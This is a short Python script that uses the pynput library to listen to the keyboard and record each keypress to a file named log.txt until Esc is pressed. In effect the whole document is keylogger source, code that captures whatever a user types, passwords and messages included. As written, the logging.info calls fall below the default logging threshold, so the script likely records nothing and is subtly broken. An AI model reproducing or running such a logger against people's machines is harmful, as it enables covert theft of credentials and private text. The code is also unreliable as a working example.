from pynput import mouse, keyboard
from pynput.keyboard import Key
import logging

logging.basicConfig(filename="log.txt",format='%(asctime)s %(message)s',
                    filemode='w')

def on_press(key):
    if key == Key.esc: return False
    else:
        logging.info(key)

with keyboard.Listener(
    on_press=on_press
) as keyboard_listner:
    keyboard_listner.join()
    